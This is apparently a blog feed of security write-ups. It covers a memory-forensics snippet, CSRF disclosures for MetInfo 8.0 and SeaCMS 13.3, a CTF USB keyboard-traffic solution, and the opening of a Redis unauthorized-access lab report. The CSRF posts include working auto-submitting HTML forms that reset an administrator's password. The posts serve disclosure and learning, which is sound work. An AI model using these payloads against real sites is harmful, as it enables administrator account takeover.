class="hljs-variable">windows</span><span class="hljs-operator">.</span><span class="hljs-variable">filescan</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-built_in">File</span> <span class="hljs-operator">-</span><span class="hljs-variable">FilePath</span> <span class="hljs-variable">filescan</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span> <span class="hljs-operator">-</span><span class="hljs-variable">Encoding</span> <span class="hljs-variable">utf8</span><br><span class="hljs-built_in">Select</span><span class="hljs-operator">-</span><span class="hljs-built_in">String</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-variable">filescan</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span> <span class="hljs-string">&quot;Interfaces&quot;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-type">interfaces_files</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250728172547439-1762502502517-7.png" alt="image-20250728172547439"></p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>解题思路</tag>
      
      <tag>技能提升</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF Vulnerability in MetInfo 8.0 Allows Arbitrary Admin Password Change</title>
    <link href="/2025/10/05/CSRF-Vulnerability-in-MetInfo-Admin-Password-Change/"/>
    <url>/2025/10/05/CSRF-Vulnerability-in-MetInfo-Admin-Password-Change/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF-Vulnerability-in-MetInfo-8-0-Allows-Arbitrary-Admin-Password-Change"><a href="#CSRF-Vulnerability-in-MetInfo-8-0-Allows-Arbitrary-Admin-Password-Change" class="headerlink" title="CSRF Vulnerability in MetInfo 8.0 Allows Arbitrary Admin Password Change"></a>CSRF Vulnerability in MetInfo 8.0 Allows Arbitrary Admin Password Change</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A Cross-Site Request Forgery (CSRF) vulnerability exists in MetInfo 8.0 that allows an attacker to change an administrator’s password without consent. By luring a logged-in admin to visit a crafted page, an auto-submitted POST request can update the admin profile password, resulting in account takeover.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li>Product: MetInfo CMS</li><li>Version: 8.0</li><li>Component: Admin Profile Update (<code>/admin/?n=admin&amp;c=index&amp;a=doSaveInfo</code>)</li><li>CWE: CWE-352: Cross-Site Request Forgery (CSRF)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>The environment was set up locally using PHPStudy. Accessed the admin panel and navigated to the personal profile page to update the administrator password. The operation was intercepted and analyzed to assess CSRF protections. The password was changed from the original value to <code>123456</code> via the vulnerable endpoint.</p><p>Admin profile update interface:</p><p><img src="/img/image-20251005223708294.png" alt="Admin Profile Page"></p><p>Generating a CSRF PoC from the captured request:</p><p><img src="/img/image-20251005223821480.png" alt="Generate CSRF PoC"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>Save the following HTML as <code>csrf2.html</code>. When a logged-in admin visits the page, the form will auto-submit and change the admin password to <code>123456</code> without any user interaction.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://metlnfo/admin/?n=admin&amp;c=index&amp;a=doSaveInfo&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin_pass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin_pass_replay&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin_name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;fjl&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin_mobile&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;admin_email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1@qq.com&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit_type&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;save&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);</span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Open the PoC in a browser (e.g., Edge) while logged into MetInfo as admin:</p><p><img src="/img/image-20251005224021767.png" alt="Open PoC"></p><p>Submitting the request indicates success:</p><p><img src="/img/image-20251005224234171.png" alt="Request Success"></p><p>Re-login verifies the password has been changed:</p><p><img src="/img/image-20251005224401106.png" alt="Re-login"></p><p><img src="/img/image-20251005224326823.png" alt="Login Success"></p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><ul><li>Type: Cross-Site Request Forgery (CSRF)</li><li>Who is impacted: Any authenticated administrator who can be tricked into visiting an attacker-controlled page</li><li>Consequences:<ol><li>Unauthorized password change leading to administrator account takeover</li><li>Further compromise of the system by performing privileged actions</li></ol></li></ul><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To mitigate this issue, MetInfo should:</p><ol><li>Enforce robust CSRF protections: include unpredictable per-session&#x2F;per-request tokens and validate them server-side</li><li>Validate <code>Origin</code>&#x2F;<code>Referer</code> headers for state-changing requests</li><li>Require re-authentication (current password) for sensitive operations such as password changes</li><li>Apply SameSite cookies and disable cross-site requests where appropriate</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2025-10-05: Vulnerability documented and PoC prepared</li><li>[Future Date]: Vendor notified</li><li>[Future Date]: CVE requested&#x2F;assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSRF</tag>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF Vulnerability in SeaCMS 13.3 Enables Admin Password Change</title>
    <link href="/2025/10/05/CSRF-Vulnerability-in-SeaCMS-Admin-Password-Change/"/>
    <url>/2025/10/05/CSRF-Vulnerability-in-SeaCMS-Admin-Password-Change/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF-Vulnerability-in-SeaCMS-13-3-Enables-Admin-Password-Change"><a href="#CSRF-Vulnerability-in-SeaCMS-13-3-Enables-Admin-Password-Change" class="headerlink" title="CSRF Vulnerability in SeaCMS 13.3 Enables Admin Password Change"></a>CSRF Vulnerability in SeaCMS 13.3 Enables Admin Password Change</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A Cross-Site Request Forgery (CSRF) vulnerability exists in SeaCMS 13.3 that allows an attacker to change an administrator’s password without consent. By tricking a logged-in admin into visiting a crafted page, a hidden form auto-submits to the admin management endpoint, resulting in unauthorized password changes and potential account takeover.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li>Product: SeaCMS</li><li>Version: 13.3</li><li>Component: Admin management (<code>/1j2jdm/admin_manager.php?action=save&amp;id=1</code>)</li><li>CWE: CWE-352: Cross-Site Request Forgery (CSRF)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>The environment was set up locally using PHPStudy, accessing the site at <code>http://seacms/1j2jdm</code>. After logging into the admin panel and navigating to the administrator edit page (target user password from <code>111111</code>), a request to change the password was captured for analysis.</p><p>Admin edit interface and captured request:</p><p><img src="/img/image-20251005213837382.png" alt="Admin Edit Interface"></p><p><img src="/img/image-20251005214017493.png" alt="Captured Request"></p><p>Generating a CSRF PoC from the captured request:</p><p><img src="/img/image-20251005214136942.png" alt="Generate CSRF PoC"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>Save the following as <code>csrf3.html</code>. When a logged-in admin visits the page, the form auto-submits to change the administrator’s password to <code>111111</code> without interaction.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://seacms/1j2jdm/admin_manager.php?action=save&amp;id=1&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111111&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd2&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111111&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;groupid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;state&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;v_eidtsubmit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);</span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Open the PoC in Edge while logged into SeaCMS as admin and submit:</p><p><img src="/img/image-20251005214405452.png" alt="Open PoC"></p><p>The request succeeds and the user’s password is changed:</p><p><img src="/img/image-20251005214524522.png" alt="Password Changed"></p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><ul><li>Type: Cross-Site Request Forgery (CSRF)</li><li>Who is impacted: Any authenticated administrator who can be lured to visit an attacker-controlled page</li><li>Consequences:<ol><li>Unauthorized password change and administrator account takeover</li><li>Further compromise of the application by performing privileged actions</li></ol></li></ul><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To mitigate this issue, SeaCMS should:</p><ol><li>Enforce strong CSRF protections (unpredictable per-session&#x2F;per-request tokens validated server-side)</li><li>Validate <code>Origin</code>&#x2F;<code>Referer</code> headers for state-changing requests</li><li>Require re-authentication (current password) for sensitive operations like password changes</li><li>Apply SameSite cookies and restrict cross-site requests where appropriate</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2025-10-05: Vulnerability documented and PoC prepared</li><li>[Future Date]: Vendor notified</li><li>[Future Date]: CVE requested&#x2F;assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSRF</tag>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[NISACTF 2022]损坏的flag</title>
    <link href="/2025/09/19/CTF%E7%AB%9E%E8%B5%9B/MISC/NISACTF-2022-%E6%8D%9F%E5%9D%8F%E7%9A%84flag/"/>
    <url>/2025/09/19/CTF%E7%AB%9E%E8%B5%9B/MISC/NISACTF-2022-%E6%8D%9F%E5%9D%8F%E7%9A%84flag/</url>
    
    <content type="html"><![CDATA[<p>本篇将分享一道关于 USB 流量分析的 CTF 题目解题思路，题目来自 <a href="https://buuoj.cn/challenges#%5BNISACTF%202022%5D%E6%8D%9F%E5%9D%8F%E7%9A%84flag">[NISACTF 2022]损坏的flag</a>。</p><h3 id="1-识别文件类型并加载"><a href="#1-识别文件类型并加载" class="headerlink" title="1. 识别文件类型并加载"></a>1. 识别文件类型并加载</h3><ol><li><p><strong>文件类型识别</strong>：<br>使用 010 Editor 打开附件 <code>atta.NISACTF_2022flag</code>，观察到其文件头为 <code>D4 C3 B2 A1</code>，这是 libpcap 格式的典型特征（Magic Number）。</p><p><img src="/img/screenshot-2025-07-25-101554.png" alt="文件头识别"></p></li><li><p><strong>加载流量包</strong>：<br>将文件名后缀修改为 <code>.pcap</code>，然后使用 Wireshark 打开。观察发现流量包内容为 USB 协议数据。</p><p><img src="/img/image-20250725112420431.png" alt="USB 流量"></p></li></ol><h3 id="2-提取键盘流量数据"><a href="#2-提取键盘流量数据" class="headerlink" title="2. 提取键盘流量数据"></a>2. 提取键盘流量数据</h3><ol><li><p><strong>流量特征分析</strong>：<br>在 Wireshark 中，可以看到 USB 数据包的 <code>Leftover Capture Data</code> 字段长度为 8 字节，且通常只有第 3 个字节非零。这是 USB HID 键盘数据的典型特征。</p><p><img src="/img/screenshot-2025-07-25-112632.png" alt="键盘流量特征"></p></li><li><p><strong>使用 tshark 批量提取</strong>：<br>为了提取所有键盘击键数据，可使用 <code>tshark</code> 命令行工具。执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r atta.NISACTF_2022flag.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>该命令会从流量包中提取所有 <code>usb.capdata</code> 字段，并将其保存到 <code>usbdata.txt</code> 文件中。</p><p><img src="/img/image-20250725112858452.png" alt="提取的数据"></p></li></ol><h3 id="3-映射数据并破译-Flag"><a href="#3-映射数据并破译-Flag" class="headerlink" title="3. 映射数据并破译 Flag"></a>3. 映射数据并破译 Flag</h3><ol><li><p><strong>编写转换脚本</strong>：<br><code>usbdata.txt</code> 中的数据是十六进制的键盘扫描码，需要根据 USB HID Usage Tables 将其转换为可读字符。以下 Python 脚本可实现此转换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br>mappings = &#123;<span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0a</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-number">0x0b</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0c</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-number">0x0d</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0e</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0f</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1a</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1b</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1c</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1d</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-number">0x1e</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1f</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-number">0x29</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-number">0x2b</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">0x2c</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-number">0x2d</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-number">0x2e</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-number">0x2f</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\&quot;,0x32:&quot;</span>&lt;NON&gt;<span class="hljs-string">&quot;,0x33:&quot;</span>;<span class="hljs-string">&quot;,0x34:&quot;</span><span class="hljs-string">&#x27;&quot;,0x35:&quot;`&quot;,0x36:&quot;,&quot;,0x37:&quot;.&quot;,0x38:&quot;/&quot;,0x39:&quot;&lt;CAP&gt;&quot;,0x3a:&quot;&lt;F1&gt;&quot;,0x3b:&quot;&lt;F2&gt;&quot;, 0x3c:&quot;&lt;F3&gt;&quot;,0x3d:&quot;&lt;F4&gt;&quot;,0x3e:&quot;&lt;F5&gt;&quot;,0x3f:&quot;&lt;F6&gt;&quot;,0x40:&quot;&lt;F7&gt;&quot;,0x41:&quot;&lt;F8&gt;&quot;,0x42:&quot;&lt;F9&gt;&quot;,0x43:&quot;&lt;F10&gt;&quot;,0x44:&quot;&lt;F11&gt;&quot;,0x45:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class="hljs-string">result = &#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">with open(&#x27;</span>usbdata.txt<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">r&#x27;) as f:</span><br><span class="hljs-string">    for line in f.readlines():</span><br><span class="hljs-string">        line = line.strip()</span><br><span class="hljs-string">        if len(line) == 16:</span><br><span class="hljs-string">            s = int(line[4:6], 16)</span><br><span class="hljs-string">        elif len(line) == 24:</span><br><span class="hljs-string">            s = int(line[6:8], 16)</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            continue</span><br><span class="hljs-string">        if s != 0 and s in mappings:</span><br><span class="hljs-string">            result += mappings[s]</span><br><span class="hljs-string">print(result)</span><br></code></pre></td></tr></table></figure></li><li><p><strong>分析转换结果</strong>：<br>运行脚本，得到转换后的字符串。</p><p><img src="/img/image-20250725121901863.png" alt="转换结果"></p></li><li><p><strong>获取 Flag</strong>：<br>观察输出的字符序列，它们在标准键盘布局上构成一个闭合形状，包围的字母即为 Flag。</p><p><img src="/img/image-20250725122029750.png" alt="键盘布局"></p><p><strong>Flag</strong>: <code>welcome_to_fjnu</code></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>USB</tag>
      
      <tag>流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis4-unacc未授权访问漏洞复现</title>
    <link href="/2025/08/23/Redis4-unacc%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/23/Redis4-unacc%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis4-unacc未授权访问漏洞复现"><a href="#Redis4-unacc未授权访问漏洞复现" class="headerlink" title="Redis4-unacc未授权访问漏洞复现"></a>Redis4-unacc未授权访问漏洞复现</h1><h2 id="一、报告目的"><a href="#一、报告目的" class="headerlink" title="一、报告目的"></a>一、报告目的</h2><h3 id="1-1-报告对象：授课老师和一起学习的同学"><a href="#1-1-报告对象：授课老师和一起学习的同学" class="headerlink" title="1.1 报告对象：授课老师和一起学习的同学"></a>1.1 报告对象：授课老师和一起学习的同学</h3><h3 id="1-2-报告目的"><a href="#1-2-报告目的" class="headerlink" title="1.2 报告目的"></a>1.2 报告目的</h3><p>详细阐述 Redis 未授权访问漏洞复现的实验过程，包括环境搭建、漏洞利用步骤等，让读者清晰了解该漏洞的利用原理和危害；深入分析实验过程中产生的日志数据，总结漏洞利用过程中的行为特征，为漏洞防范提供依据；通过实验总结经验教训，提出有效的漏洞修复建议和安全防范措施，提升自身及他人的安全意识和技能。</p><h3 id="1-3-报告评价"><a href="#1-3-报告评价" class="headerlink" title="1.3 报告评价"></a>1.3 报告评价</h3><p>希望老师和同学通过本报告，认可我对 Redis 未授权访问漏洞的深入理解和掌握，肯定我在实验过程中的严谨态度和分析问题的能力。同时，也希望报告中的内容能够对他们在学习和研究网络安全漏洞方面有所帮助，引发更多的思考和讨论。</p><h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p>Redis 是一个开源的内存数据存储系统，在默认配置下，如果未设置密码且绑定在公网可访问的地址上，就会存在未授权访问漏洞。攻击者可以直接连接 Redis 服务，执行各种命令，如读取、修改数据，甚至通过修改配置文件、加载恶意模块等方式获取服务器权限，导致数据泄露、服务器被控制等严重后果。</p><h2 id="三、漏洞详情说明"><a href="#三、漏洞详情说明" class="headerlink" title="三、漏洞详情说明"></a>三、漏洞详情说明</h2><h3 id="3-1-影响范围"><a href="#3-1-影响范围" class="headerlink" title="3.1 影响范围"></a>3.1 影响范围</h3><p><strong>版本方面</strong>：Redis 2.x、3.x、4.x、5.x 版本都受影响。通常在这些版本中，若采用默认配置且无额外安全防护措施，就可能存在该漏洞风险。</p><p><strong>部署环境方面</strong>：在云服务器、企业内部服务器等各种部署环境中，如果 Redis 绑定在 0.0.0.0:6379 且未添加防火墙规则等安全策略，同时没有设置密码认证或使用弱密码，都可能被未授权访问。如在一些企业自行搭建的私有云环境中，若对 Redis 配置不当，就可能使 Redis 服务暴露在公网上，进而面临风险。</p><p><strong>应用场景方面</strong>：广泛应用于缓存系统、消息队列、实时数据处理等场景的 Redis，一旦出现未授权访问漏洞，在这些场景下都可能导致数据泄露、数据被篡改等问题。比如在电商系统中用 Redis 做缓存，若存在漏洞，攻击者可能获取用户订单、商品库存等敏感信息。</p><h3 id="3-2-评分"><a href="#3-2-评分" class="headerlink" title="3.2 评分"></a>3.2 评分</h3><p>按照常见的漏洞评分系统 CVSS 